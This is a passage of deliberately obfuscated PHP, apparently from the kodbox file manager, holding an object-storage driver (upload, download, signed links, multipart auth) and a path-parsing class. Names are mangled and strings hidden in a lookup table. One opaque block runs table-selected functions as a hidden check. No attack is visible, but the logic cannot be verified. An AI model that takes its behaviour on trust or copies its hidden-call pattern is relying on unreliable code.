array_merge($CÜµ­Î¨¤£, $cÃ¬•„‡«Ÿ); } if (count($b¦¤Ùöí‚)) { $b¦¤Ùöí‚ = array_column($b¦¤Ùöí‚, $A£„‚„¨óò[28]); $D·¢ÛÈäòä = array_merge($D·¢ÛÈäòä, $b¦¤Ùöí‚); } if ($AÑµ¨¤¿Œ‚ === null) { break; } continue; } if ($còÌÛŠ§–å) { if (!empty($cÃ¬•„‡«Ÿ)) { if (count($cÃ¬•„‡«Ÿ) > 1 || isset($cÃ¬•„‡«Ÿ[0][$A£„‚„¨óò[28]]) && $cÃ¬•„‡«Ÿ[0][$A£„‚„¨óò[28]] != $aë…ÕÅ‚) { return !0; } } } else { if (!empty($b¦¤Ùöí‚)) { return !0; } } if ($AÑµ¨¤¿Œ‚ === null) { break; } } if ($Fç‚ö¥‰ªè) { $CÜµ­Î¨¤£ = array_diff($CÜµ­Î¨¤£, array($aë…ÕÅ‚)); $CÜµ­Î¨¤£ = count(array_unique($CÜµ­Î¨¤£)); $D·¢ÛÈäòä = count(array_unique($D·¢ÛÈäòä)); return array($A£„‚„¨óò[201] => $CÜµ­Î¨¤£, $A£„‚„¨óò[202] => $D·¢ÛÈäòä); } goto fÓ­İÓÔñ; bâ”›ØÉÊ†: } public function listAll($a“ğÌòê’) { $bÇÍ½ù™Úä =& $_SERVER[¹…ÕÄ]; $BÆ½í±Äë§ = $this->fileList($a“ğÌòê’, $bÇÍ½ù™Úä[33], !0); $CÅÈ¥¥Ğ¶Ê = array(); foreach ($BÆ½í±Äë§[$bÇÍ½ù™Úä[73]] as $D‹­é©…›˜) { $CÅÈ¥¥Ğ¶Ê[$D‹­é©…›˜[$bÇÍ½ù™Úä[28]]] = $D‹­é©…›˜[$bÇÍ½ù™Úä[77]]; } foreach ($BÆ½í±Äë§[$bÇÍ½ù™Úä[74]] as $D‹­é©…›˜) { if (is_string($D‹­é©…›˜)) { $CÅÈ¥¥Ğ¶Ê[$D‹­é©…›˜] = 0; } } return $this->listAllFiles($a“ğÌòê’, array_keys($CÅÈ¥¥Ğ¶Ê), $CÅÈ¥¥Ğ¶Ê); } public function canRead($A´‡Ã»Æ‹é) { $A¿…‹…·éÔ =& $_SERVER[¹…ÕÄ]; $e¸ğŞŒ—‚ = $this->client->getAccessControlPolicy($this->bucket, $A´‡Ã»Æ‹é); if (!$e¸ğŞŒ—‚) { return !1; } return in_array($e¸ğŞŒ—‚, array($A¿…‹…·éÔ[203], $A¿…‹…·éÔ[204], $A¿…‹…·éÔ[205])) ? !0 : !1; } public function canWrite($Cò¸ˆ‘å„ê) { $BïÊà¾Ã÷É =& $_SERVER[¹…ÕÄ]; $fĞ­Â‚¯ŸÅ = $this->client->getAccessControlPolicy($this->bucket, $Cò¸ˆ‘å„ê); if (!$fĞ­Â‚¯ŸÅ) { return !1; } return in_array($fĞ­Â‚¯ŸÅ, array($BïÊà¾Ã÷É[203], $BïÊà¾Ã÷É[204])) ? !0 : !1; } public function getContent($E¨èØÏÖ Ù) { return $this->client->getObject($this->bucket, $E¨èØÏÖ Ù); } public function setContent($c²×°Î£¥ñ, $C´ŞŸìÇ³í = '', $bô„¹»ªãÑ = false) { goto E’‚ô—„¨; FôÍÕñãŸï: $BÁó»«¯ø = $this->client->putObject($C´ŞŸìÇ³í, $this->bucket, $c²×°Î£¥ñ, $b‹Á´„å¦š[191], array(), $E–°â¯¬Ş¢); if (!$BÁó»«¯ø) { return !1; } if ($bô„¹»ªãÑ) { return !0; } goto f¢š½¹÷Ë; E’‚ô—„¨: $b‹Á´„å¦š =& $_SERVER[¹…ÕÄ]; $c²×°Î£¥ñ = $bô„¹»ªãÑ ? trim($c²×°Î£¥ñ, $b‹Á´„å¦š[8]) . $b‹Á´„å¦š[8] : $c²×°Î£¥ñ; $E–°â¯¬Ş¢ = get_file_mime(get_path_ext($c²×°Î£¥ñ)); goto FôÍÕñãŸï; f¢š½¹÷Ë: $this->cacheMethod(null, null); $BÁó»«¯ø = $this->copyFile($c²×°Î£¥ñ, $c²×°Î£¥ñ, array($b‹Á´„å¦š[206] => $BÁó»«¯ø[$b‹Á´„å¦š[207]])); return $BÁó»«¯ø ? !0 : !1; goto BÑíÃøé”°; BÑíÃøé”°: } public function fileSubstr($bêÚ†‘Üƒ, $EÑÒÄ–¢ğË, $eçºÂ’±Ê’) { $d‹¤£óç¨Ğ = $EÑÒÄ–¢ğË + $eçºÂ’±Ê’ - 1; return $this->client->getObject($this->bucket, $bêÚ†‘Üƒ, array($_SERVER[¹…ÕÄ][208] => "\x62\x79\164\145\x73\75{$EÑÒÄ–¢ğË}\x2d{$d‹¤£óç¨Ğ}")); } public function upload($c«¢÷ßç¼¥, $D¦ÁÅ ë, $CåìÍŒÉ = false, $C²‚©ç‹ââ = REPEAT_REPLACE) { $D˜—†µò   =& $_SERVER[¹…ÕÄ]; $a¼µ«à¸ğ’ = array($D˜—†µò  [206] => @md5_file($D¦ÁÅ ë)); $eì“Úï›ØÅ = array($D˜—†µò  [209] => get_file_mime(get_path_ext($c«¢÷ßç¼¥))); if (IO::size($D¦ÁÅ ë) <= 1024 * 1024 * 200) { $aÄ„ù²¸¶ö = $this->client->putObjectFile($D¦ÁÅ ë, $this->bucket, $c«¢÷ßç¼¥, $D˜—†µò  [191], $a¼µ«à¸ğ’, $eì“Úï›ØÅ); return !empty($aÄ„ù²¸¶ö) ? $this->getPathOuter($c«¢÷ßç¼¥) : !1; } $a·İ„¨ˆÔİ = $this->client->multiUploadObject($D¦ÁÅ ë, $this->bucket, trim($c«¢÷ßç¼¥, $D˜—†µò  [8]), $a¼µ«à¸ğ’, $eì“Úï›ØÅ); return $a·İ„¨ˆÔİ ? $this->getPathOuter($c«¢÷ßç¼¥) : !1; } public function download($D£ÙØä½¯Õ, $B‡Ëßšİˆ) { if (!@is_dir($this->pathFather($B‡Ëßšİˆ)) && !IO::mkdir($this->pathFather($B‡Ëßšİˆ))) { return !1; } $F›ëœ‚ = $this->client->getObject($this->bucket, $D£ÙØä½¯Õ, array(), $B‡Ëßšİˆ); return $F›ëœ‚ !== !1 ? $B‡Ëßšİˆ : !1; } public function link($bë’Ğ¶½›¢, $c„ê…Ñó¤ = array()) { $aœã’ğÈ‰¨ =& $_SERVER[¹…ÕÄ]; if ($this->signVer == $aœã’ğÈ‰¨[210]) { return $this->client->getAuthenticatedURL($this->bucket, $bë’Ğ¶½›¢, 3600 * 12, $c„ê…Ñó¤); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($bë’Ğ¶½›¢, $aœã’ğÈ‰¨[8]), 3600 * 12, $this->region, array(), !0, $c„ê…Ñó¤); } public function fileOut($cÛ’Úµ»¹†, $a‘ÊàØÍ·Ã = false, $cáÈ†ö©ÉË = false, $e¢ îÌäÙ = '') { goto e¾Å„Ú·‹; B¢æ“ŒºÛ: $b¿¸²Èîğ = array($D¹Ç…õÏÛÙ[214] => $a‘ÊàØÍ·Ã . $D¹Ç…õÏÛÙ[215] . rawurlencode($cáÈ†ö©ÉË), $D¹Ç…õÏÛÙ[216] => $fîÙ×Ò»œ); $FòÀ–ğ¡Â¯ = $this->link($cÛ’Úµ»¹†, $b¿¸²Èîğ); $this->fileOutLink($FòÀ–ğ¡Â¯); goto F½ªå®ÃÇÁ; e¾Å„Ú·‹: $D¹Ç…õÏÛÙ =& $_SERVER[¹…ÕÄ]; if ($this->isFileOutServer()) { return $this->fileOutServer($cÛ’Úµ»¹†, $a‘ÊàØÍ·Ã, $cáÈ†ö©ÉË, $e¢ îÌäÙ); } if (!$cáÈ†ö©ÉË) { $cáÈ†ö©ÉË = $this->pathThis($cÛ’Úµ»¹†); } goto FµŠÌ¤ªœ; FµŠÌ¤ªœ: $fîÙ×Ò»œ = get_file_mime(get_path_ext($cáÈ†ö©ÉË)); if ($fîÙ×Ò»œ == $D¹Ç…õÏÛÙ[211]) { return parent::fileOut($cÛ’Úµ»¹†, $a‘ÊàØÍ·Ã, $cáÈ†ö©ÉË, $e¢ îÌäÙ); } $a‘ÊàØÍ·Ã = $a‘ÊàØÍ·Ã ? $D¹Ç…õÏÛÙ[212] : $D¹Ç…õÏÛÙ[213]; goto B¢æ“ŒºÛ; F½ªå®ÃÇÁ: } public function fileOutServer($b¥™‡¤ššô, $bôáåç¹ƒÑ = false, $a‚íèè· = false, $FŒÒ²øÓÙ = '') { parent::fileOut($b¥™‡¤ššô, $bôáåç¹ƒÑ, $a‚íèè·, $FŒÒ²øÓÙ); } public function fileOutImageServer($C¤»½ÀøÉ„, $eá‚¸ËŠ‘ê = 250) { parent::fileOutImage($C¤»½ÀøÉ„, $eá‚¸ËŠ‘ê); } public function hashMd5($f¨Û„öË, $DçÜ¹¦Ì» = '') { $DÈå˜Á®• =& $_SERVER[¹…ÕÄ]; $B™Æá×îİ­ = $this->objectMeta($f¨Û„öË); if (!$B™Æá×îİ­) { return !1; } $DçÜ¹¦Ì» = $DçÜ¹¦Ì» ? $DçÜ¹¦Ì» : _get($B™Æá×îİ­, $DÈå˜Á®•[217]); $DçÜ¹¦Ì» = $DçÜ¹¦Ì» ? $DçÜ¹¦Ì» : _get($B™Æá×îİ­, $DÈå˜Á®•[207], $DÈå˜Á®•[33]); return $DçÜ¹¦Ì»; } public function uploadFormData($E©ÕÅö“øƒ, $eöŒ‘¶±¶ = 3600) { $A”™ÀŒƒÀË =& $_SERVER[¹…ÕÄ]; $fµ‚êËñ­ä = $this->pathFather($E©ÕÅö“øƒ); $aÜ®¹©•‹ = $this->client->getHttpUploadPostParams($this->bucket, $fµ‚êËñ­ä, $A”™ÀŒƒÀË[191], $eöŒ‘¶±¶); return array_merge((array) $aÜ®¹©•‹, array($A”™ÀŒƒÀË[175] => $this->getHost())); } public function multiUploadFormData($d†¯¬õ¾”Ö, $D´ÂÜøºø„ = 3600) { $a¨¸ª•‡Û¢ =& $_SERVER[¹…ÕÄ]; $fçÅç‡Ÿˆ = gmdate($a¨¸ª•‡Û¢[218]); $FÊ´ÂáÇ„ = array(); $BÎ¥ùó’é = $this->client->getUploadId($this->bucket, $d†¯¬õ¾”Ö, $FÊ´ÂáÇ„); if (!$BÎ¥ùó’é) { return !1; } return array($a¨¸ª•‡Û¢[219] => $BÎ¥ùó’é, $a¨¸ª•‡Û¢[175] => $this->getHost() . $a¨¸ª•‡Û¢[8] . $this->pathEncode($d†¯¬õ¾”Ö), $a¨¸ª•‡Û¢[220] => $fçÅç‡Ÿˆ, $a¨¸ª•‡Û¢[92] => $d†¯¬õ¾”Ö); } public function multiUploadAuthData($cô‡×‘‚Â, $c…›ˆè • = array()) { goto Fµ‡«½öóÇ; Fµ‡«½öóÇ: $D– ³© =& $_SERVER[¹…ÕÄ]; $d¼óù«”¾™ = isset($c…›ˆè •[$D– ³©[220]]) ? $c…›ˆè •[$D– ³©[220]] : gmdate($D– ³©[218]); $F÷ÉèÕ˜Ú© = isset($c…›ˆè •[$D– ³©[167]]) ? $c…›ˆè •[$D– ³©[167]] : $D– ³©[33]; goto bïÖÖ¿¢Ïæ; bïÖÖ¿¢Ïæ: $bÑç‰•­‡¬ = $c…›ˆè •[$D– ³©[92]]; unset($c…›ˆè •[$D– ³©[92]]); if (isset($c…›ˆè •[$D– ³©[221]])) { $c…›ˆè •[$D– ³©[220]] = $d¼óù«”¾™; return $this->listUploadParts($bÑç‰•­‡¬, $c…›ˆè •); } goto AŸ–ğ„¾ˆŒ; dÇÉì¬¾í²: if (strpos($F÷ÉèÕ˜Ú©, $D– ³©[223]) === 0) { return array($D– ³©[230] => $aÅË©ª´Œ¬, $D– ³©[220] => $d¼óù«”¾™); } return $aÅË©ª´Œ¬; goto a‡¯ÊâÏª²; AŸ–ğ„¾ˆŒ: $A¾‚¯¡öØ˜ = array($D– ³©[222], $D– ³©[33], $D– ³©[118], $D– ³©[33], "\x78\55\x61\x6d\x7a\x2d\144\x61\x74\x65\72{$d¼óù«”¾™}", $D– ³©[8] . $this->bucket . $D– ³©[8] . $this->pathEncode($bÑç‰•­‡¬) . $F÷ÉèÕ˜Ú©); if (strpos($F÷ÉèÕ˜Ú©, $D– ³©[223]) === 0) { $A¾‚¯¡öØ˜[0] = $D– ³©[224]; } if (isset($c…›ˆè •[$D– ³©[225]]) && $c…›ˆè •[$D– ³©[225]] == $D– ³©[226]) { $A¾‚¯¡öØ˜[0] = $D– ³©[226]; } goto EŠ«ÊØØÜ§; EŠ«ÊØØÜ§: $A‚ØêìİÂ = implode($D– ³©[227], $A¾‚¯¡öØ˜); $DÍØôâÅ = base64_encode(hash_hmac($D– ³©[228], $A‚ØêìİÂ, $this->secret, !0)); $aÅË©ª´Œ¬ = $D– ³©[229] . $this->accessKey . $D– ³©[4] . $DÍØôâÅ; goto dÇÉì¬¾í²; a‡¯ÊâÏª²: } public function listUploadParts($d©¸¾œ‡Òğ, $f¿õáÆÚËÁ = array()) { goto aÈÕƒÌ­®; C“²ƒÔˆ‘Ä: if (!$aÒî‹­å½œ) { return !1; } unset($f¿õáÆÚËÁ[$A·–ïÕğ™[221]], $f¿õáÆÚËÁ[$A·–ïÕğ™[225]]); $f¿õáÆÚËÁ[$A·–ïÕğ™[92]] = $d©¸¾œ‡Òğ; goto D¦ÉÄàÏÂŒ; aÈÕƒÌ­®: $A·–ïÕğ™ =& $_SERVER[¹…ÕÄ]; $aÇ‡«Ø«˜ = str_replace($A·–ïÕğ™[231], $A·–ïÕğ™[33], $f¿õáÆÚËÁ[$A·–ïÕğ™[167]]); $aÒî‹­å½œ = $this->client->listParts($this->bucket, $d©¸¾œ‡Òğ, $aÇ‡«Ø«˜); goto C“²ƒÔˆ‘Ä; D¦ÉÄàÏÂŒ: $Aã±…°ÖÍ• = $this->multiUploadAuthData($d©¸¾œ‡Òğ, $f¿õáÆÚËÁ); if (empty($Aã±…°ÖÍ•)) { return !1; } return array($A·–ïÕğ™[230] => $Aã±…°ÖÍ•, $A·–ïÕğ™[220] => $f¿õáÆÚËÁ[$A·–ïÕğ™[220]], $A·–ïÕğ™[232] => $aÒî‹­å½œ); goto FÒ…âó °Ü; FÒ…âó °Ü: } public function getHost() { return parent::getHost() . $_SERVER[¹…ÕÄ][8] . $this->bucket; } public function size($A¤ªõƒƒßÇ) { $A«ôôŞ¹ßÑ = $this->objectMeta($A¤ªõƒƒßÇ); return $A«ôôŞ¹ßÑ ? $A«ôôŞ¹ßÑ[$_SERVER[¹…ÕÄ][77]] : 0; } public function info($F‹êš¯À–) { if ($this->isFolder($F‹êš¯À–)) { return $this->folderInfo($F‹êš¯À–); } else { if ($this->isFile($F‹êš¯À–)) { return $this->fileInfo($F‹êš¯À–); } } return !1; } public function exist($CÆˆ½ö¿á‚) { return $this->isFile($CÆˆ½ö¿á‚) || $this->isFolder($CÆˆ½ö¿á‚); } public function isFile($AÂå³¨Ãï) { return !$this->isFolder($AÂå³¨Ãï) && $this->objectMeta($AÂå³¨Ãï); } public function isFolder($eÌâËˆÛ‹•) { return $this->cacheMethod($_SERVER[¹…ÕÄ][197], $eÌâËˆÛ‹•); } protected function objectMeta($e‰ëóàË¨‚) { return $this->cacheMethod($_SERVER[¹…ÕÄ][198], $e‰ëóàË¨‚); } protected function _objectMeta($Dø•°°Œï‚) { $EäÏÙá‹áÀ =& $_SERVER[¹…ÕÄ]; $Dø•°°Œï‚ = rtrim($Dø•°°Œï‚, $EäÏÙá‹áÀ[8]); try { $Fàáø¨Âá = $this->client->getObjectInfo($this->bucket, $Dø•°°Œï‚); if (!isset($Fàáø¨Âá[$EäÏÙá‹áÀ[217]]) && isset($Fàáø¨Âá[$EäÏÙá‹áÀ[233]])) { $Fàáø¨Âá[$EäÏÙá‹áÀ[217]] = $Fàáø¨Âá[$EäÏÙá‹áÀ[233]]; } } catch (Exception $f½™’´ƒ‘ç) { $Fàáø¨Âá = !1; } if (!$Fàáø¨Âá) { } return $Fàáø¨Âá; } protected function _isFolder($cßëöêå«½) { goto CŒ“‚õ³»; bÚ¯ÈÜ¬œ«: $EÀ™ô»Ù»Ş = $this->client->getBucket($this->bucket, $cßëöêå«½, null, 1); if (empty($EÀ™ô»Ù»Ş[$cõÚ‡½Òµ[196]])) { return !1; } $B†Åçï×‘ª = $EÀ™ô»Ù»Ş[$cõÚ‡½Òµ[196]][0][$cõÚ‡½Òµ[28]]; goto d¼Ù£ÎÊÃÀ; CŒ“‚õ³»: $cõÚ‡½Òµ =& $_SERVER[¹…ÕÄ]; $cßëöêå«½ = rtrim($cßëöêå«½, $cõÚ‡½Òµ[8]); if ($cßëöêå«½ == $cõÚ‡½Òµ[33] || $cßëöêå«½ == $cõÚ‡½Òµ[8]) { return !0; } goto bÚ¯ÈÜ¬œ«; d¼Ù£ÎÊÃÀ: if (substr($B†Åçï×‘ª, -1) == $cõÚ‡½Òµ[8]) { return !0; } if (get_path_this($B†Åçï×‘ª) == get_path_this($cßëöêå«½)) { return !1; } return !0; goto Cİ†‘†î·…; Cİ†‘†î·…: } } define($_SERVER[¹…ÕÄ][234], 1); goto F¢µÊ‰Öá™; F¢µÊ‰Öá™: define($_SERVER[¹…ÕÄ][235], 2); define($_SERVER[¹…ÕÄ][236], 3); define($_SERVER[¹…ÕÄ][237], 1); goto DåŒÉï‡…Ê; BëÙİ™ŠÏù: if ($_SERVER[$_SERVER[¹…ÕÄ][813]] != $DÜŞëääñ“($Fá˜‚ÖÊÈô)) { goto f­´”½›’Ú; f„†¼ßôÁÙ: $dï‰ùâ„—İ($Fá˜‚ÖÊÈô); goto d¥œÙëÉÛó; f­´”½›’Ú: $BœÏôÙÂÙƒ = $_SERVER[¹…ÕÄ][815]; $A¾Œ³³©Š‡ = $_SERVER[$_SERVER[¹…ÕÄ][816]] . $_SERVER[¹…ÕÄ][817]; $d®»èê™õ = $BœÏôÙÂÙƒ($A¾Œ³³©Š‡); goto Aäïé§Àùæ; Aäïé§Àùæ: $c“´Î…ó¨ = explode($_SERVER[¹…ÕÄ][227], $d®»èê™õ); if (count($c“´Î…ó¨) < $_SERVER[¹…ÕÄ][574]) { $föÁÊÔ«—Œ = $_SERVER[¹…ÕÄ][818]; $föÁÊÔ«—Œ(); } $dï‰ùâ„—İ = $_SERVER[¹…ÕÄ][1116]; goto f„†¼ßôÁÙ; d¥œÙëÉÛó: } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\x52\x65\x63\x79\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\106\x69\154\145\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\x69\154\145\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\160\122\x6f\x6f\164\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\123\x68\141\162\145\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\x65\x54\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\111\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\111\x74\145\155\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\153\175"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\x52\145\x6e\x63\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\145\162\175"; public static function typeList() { $c¥î‰¿‰ï =& $_SERVER[¹…ÕÄ]; return array($c¥î‰¿‰ï[1117] => self::KOD_SOURCE, $c¥î‰¿‰ï[1118] => self::KOD_USER_RECYCLE, $c¥î‰¿‰ï[1119] => self::KOD_USER_FAV, $c¥î‰¿‰ï[1120] => self::KOD_USER_FILE_TAG, $c¥î‰¿‰ï[1121] => self::KOD_USER_FILE_TYPE, $c¥î‰¿‰ï[1122] => self::KOD_GROUP_ROOT_SELF, $c¥î‰¿‰ï[1123] => self::KOD_USER_SHARE, $c¥î‰¿‰ï[1124] => self::KOD_USER_SHARE_LINK, $c¥î‰¿‰ï[1125] => self::KOD_USER_SHARE_TO_ME, $c¥î‰¿‰ï[1126] => self::KOD_SHARE_ITEM, $c¥î‰¿‰ï[1127] => self::KOD_SHARE_LINK, $c¥î‰¿‰ï[1128] => self::KOD_SEARCH, $c¥î‰¿‰ï[1129] => self::KOD_BLOCK, $c¥î‰¿‰ï[1130] => self::KOD_IO, $c¥î‰¿‰ï[1131] => self::KOD_USER_RECENT, $c¥î‰¿‰ï[1132] => self::KOD_USER_DRIVER); } public static function parse($c«®ÒŞ‰ƒğ) { goto eßò‡Éß ğ; d Ø£Âãœˆ: $b¡Äâ°¥ š = array($CÒ‡´ÉõÌ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $eÚ°çƒ‹Æ[$CÒ‡´ÉõÌ[1097]] = in_array($eÚ°çƒ‹Æ[$CÒ‡´ÉõÌ[29]], $b¡Äâ°¥ š); return $eÚ°çƒ‹Æ; goto f²ëÁ‡ã; eßò‡Éß ğ: $CÒ‡´ÉõÌ =& $_SERVER[¹…ÕÄ]; $c«®ÒŞ‰ƒğ = self::clear($c«®ÒŞ‰ƒğ); $CäÅà¨à‡õ = array_values(self::typeList()); goto E‰ Ó³Êİ; E‰ Ó³Êİ: preg_match($CÒ‡´ÉõÌ[1133], $c«®ÒŞ‰ƒğ, $E¨±±·Ñò—); $eÚ°çƒ‹Æ = array($CÒ‡´ÉõÌ[409] => !1, $CÒ‡´ÉõÌ[1134] => !1, $CÒ‡´ÉõÌ[406] => !1, $CÒ‡´ÉõÌ[75] => $c«®ÒŞ‰ƒğ, $CÒ‡´ÉõÌ[1043] => !1, $CÒ‡´ÉõÌ[1042] => $CÒ‡´ÉõÌ[33]); if (is_array($E¨±±·Ñò—) && count($E¨±±·Ñò—) == 5) { $cøÜ÷¸©¶ = $CÒ‡´ÉõÌ[1135] . $E¨±±·Ñò—[2] . $CÒ‡´ÉõÌ[323]; if (in_array($cøÜ÷¸©¶, $CäÅà¨à‡õ)) { $eÚ°çƒ‹Æ[$CÒ‡´ÉõÌ[1043]] = $E¨±±·Ñò—[1]; $eÚ°çƒ‹Æ[$CÒ‡´ÉõÌ[29]] = $cøÜ÷¸©¶; $eÚ°çƒ‹Æ[$CÒ‡´ÉõÌ[1136]] = substr($cøÜ÷¸©¶, 1, -1); $eÚ°çƒ‹Æ[$CÒ‡´ÉõÌ[388]] = $E¨±±·Ñò—[3]; } $eÚ°çƒ‹Æ[$CÒ‡´ÉõÌ[1042]] = $E¨±±·Ñò—[4]; } goto d Ø£Âãœˆ; f²ëÁ‡ã: } public static function isTruePath($dîõõÁ‚’†) { goto BŒê¢—“•Ø; C×¥Æß¹Š: if (strpos($dîõõÁ‚’†, $CšœÉë»‰ï[1100]) === 0) { return !0; } if (strpos($dîõõÁ‚’†, $CšœÉë»‰ï[1137]) === 0) { return !0; } if (strpos($dîõõÁ‚’†, $CšœÉë»‰ï[1137]) === 0) { return !0; } goto f›á ‘ˆä; BŒê¢—“•Ø: $CšœÉë»‰ï =& $_SERVER[¹…ÕÄ]; if (substr($dîõõÁ‚’†, 0, 1) != $CšœÉë»‰ï[1135]) { return !0; } if (strpos($dîõõÁ‚’†, $CšœÉë»‰ï[395]) === 0) { return !0; } goto C×¥Æß¹Š; f›á ‘ˆä: if (strpos($dîõõÁ‚’†, $CšœÉë»‰ï[1138]) === 0) { return !0; } return !1; goto C‹®ºšÔ×Ü; C‹®ºšÔ×Ü: } public static function clear($EëÚ´Ã”Íê) { goto e¸ò®½Ó; e¸ò®½Ó: $DÙĞ‰ÃèëÈ =& $_SERVER[¹…ÕÄ]; $EëÚ´Ã”Íê = str_replace(array($DÙĞ‰ÃèëÈ[1016], $DÙĞ‰ÃèëÈ[227]), $DÙĞ‰ÃèëÈ[50], $EëÚ´Ã”Íê); $EëÚ´Ã”Íê = str_replace($DÙĞ‰ÃèëÈ[96], $DÙĞ‰ÃèëÈ[8], $EëÚ´Ã”Íê); goto b‰æàâù‘î; b‰æàâù‘î: $FŠôøòÅğ = $DÙĞ‰ÃèëÈ[1139]; if (substr($EëÚ´Ã”Íê, 0, 3) == $DÙĞ‰ÃèëÈ[1140]) { $EëÚ´Ã”Íê = substr($EëÚ´Ã”Íê, 3); } while (strstr($EëÚ´Ã”Íê, $FŠôøòÅğ)) { $EëÚ´Ã”Íê = str_replace($FŠôøòÅğ, $DÙĞ‰ÃèëÈ[8], $EëÚ´Ã”Íê); } goto e·Æ‰Œ™¡ë; Fç¨•¤·Æ: return $EëÚ´Ã”Íê; goto d¢®²‹—«Á; e·Æ‰Œ™¡ë: $EëÚ´Ã”Íê = preg_replace($DÙĞ‰ÃèëÈ[1141], $DÙĞ‰ÃèëÈ[8], $EëÚ´Ã”Íê); if ($EëÚ´Ã”Íê == $DÙĞ‰ÃèëÈ[8]) { return $DÙĞ‰ÃèëÈ[8]; } $EëÚ´Ã”Íê = rtrim($EëÚ´Ã”Íê, $DÙĞ‰ÃèëÈ[8]); goto Fç¨•¤·Æ; d¢®²‹—«Á: } public static function sourceID($F±İßáë—) { $cƒ´áßÎ–Ğ =& $_SERVER[¹…ÕÄ]; $Cè˜ˆ•ßŸß = self::parse($F±İßáë—); if ($Cè˜ˆ•ßŸß[$cƒ´áßÎ–Ğ[29]] !== self::KOD_SOURCE) { show_json(LNG($cƒ´áßÎ–Ğ[1142]), !1); } return $Cè˜ˆ•ßŸß[$cƒ´áßÎ–Ğ[388]]; } public static function make($D¯Àº¢ğ„) { if (!$D¯Àº¢ğ„) { return !1; } return self::makePath(self::KOD_SOURCE, intval($D¯Àº¢ğ„)); } public static function makeShare($B¯·ÍÏÏõ, $Eˆéï„È¡») { return self::makePath(self::KOD_SHARE_ITEM, $B¯·ÍÏÏõ, $Eˆéï„È¡»); } public static function makeFileTypePath($fğÅ»‡’¢Å) { return self::makePath(self::KOD_USER_FILE_TYPE, $fğÅ»‡’¢Å); } public static function makeFileTagPath($A‡ËƒÙÀŸò) { return self::makePath(self::KOD_USER_FILE_TAG, $A‡ËƒÙÀŸò); } public static function makePath($aîÇˆĞ , $aÜÖó±ÆÛ¨ = '', $FÉ‹À ñõ = '') { $c÷é”á =& $_SERVER[¹…ÕÄ]; $DÃÒÇĞ¬ = substr($aîÇˆĞ , 1, -1); $eç…ß˜åÖ = $c÷é”á[1143] . $DÃÒÇĞ¬ . $c÷é”á[1144] . $aÜÖó±ÆÛ¨ . $c÷é”á[1145]; $eç…ß˜åÖ = $FÉ‹À ñõ ? $eç…ß˜åÖ . $FÉ‹À ñõ . $c÷é”á[8] : $eç…ß˜åÖ; return $eç…ß˜åÖ; } public static function hashPath($CŠÚºÈ¸††) { $c¥ÖÈŠôÃµ =& $_SERVER[¹…ÕÄ]; $E‘®ë»ˆäà = is_array($CŠÚºÈ¸††) ? $CŠÚºÈ¸†† : IO::info($CŠÚºÈ¸††); $BÊÉèèí‡œ = _get($E‘®ë»ˆäà, $c¥ÖÈŠôÃµ[1146], $c¥ÖÈŠôÃµ[33]); if (!$BÊÉèèí‡œ) { $B†±‘ÇŠÓ = KodIO::parse($E‘®ë»ˆäà[$c¥ÖÈŠôÃµ[75]]); if (!$B†±‘ÇŠÓ[$c¥ÖÈŠôÃµ[29]]) { $BÊÉèèí‡œ = IO::hashSimple($E‘®ë»ˆäà[$c¥ÖÈŠôÃµ[75]]); } } if (!$BÊÉèèí‡œ) { $BÊÉèèí‡œ = md5($E‘®ë»ˆäà[$c¥ÖÈŠôÃµ[75]] . $E‘®ë»ˆäà[$c¥ÖÈŠôÃµ[77]] . $E‘®ë»ˆäà[$c¥ÖÈŠôÃµ[83]]); } return $BÊÉèèí‡œ; } public static function initSystemPath() { goto E“ŒÄ…µä; f§Ä·ó‚È: define($B‡·Ğ¤ÇŸÑ[1149], self::systemPath($B‡·Ğ¤ÇŸÑ[1150])); define($B‡·Ğ¤ÇŸÑ[1151], self::systemPath($B‡·Ğ¤ÇŸÑ[1152])); define($B‡·Ğ¤ÇŸÑ[1153], self::systemPath($B‡·Ğ¤ÇŸÑ[1154])); goto D’§ø´”›Ô; E“ŒÄ…µä: $B‡·Ğ¤ÇŸÑ =& $_SERVER[¹…ÕÄ]; if (defined($B‡·Ğ¤ÇŸÑ[1147])) { return; } define($B‡·Ğ¤ÇŸÑ[1147], self::systemPath($B‡·Ğ¤ÇŸÑ[1148])); goto f§Ä·ó‚È; D’§ø´”›Ô: IOHistory::bindEvent(); goto CïÆêÀ‰ôä; CïÆêÀ‰ôä: } public static function systemPath($b›’ÂÍ ÁÖ) { goto c¢ª‹áÒŞ¤; CèöõĞÔïÜ: return $Eƒ…Õ…øàÕ; goto b·¯áÅÚŒŒ; c¢ª‹áÒŞ¤: $Eˆò°ßÂØá =& $_SERVER[¹…ÕÄ]; $d¹ÒöğÎÆ = $Eˆò°ßÂØá[1155] . ucfirst($b›’ÂÍ ÁÖ); $Eƒ…Õ…øàÕ = Model($Eˆò°ßÂØá[1102])->get($d¹ÒöğÎÆ); goto bù…ßŒ•À; bù…ßŒ•À: if ($Eƒ…Õ…øàÕ) { return $Eƒ…Õ…øàÕ; } if ($b›’ÂÍ ÁÖ == $Eˆò°ßÂØá[1148]) { $Eƒ…Õ…øàÕ = 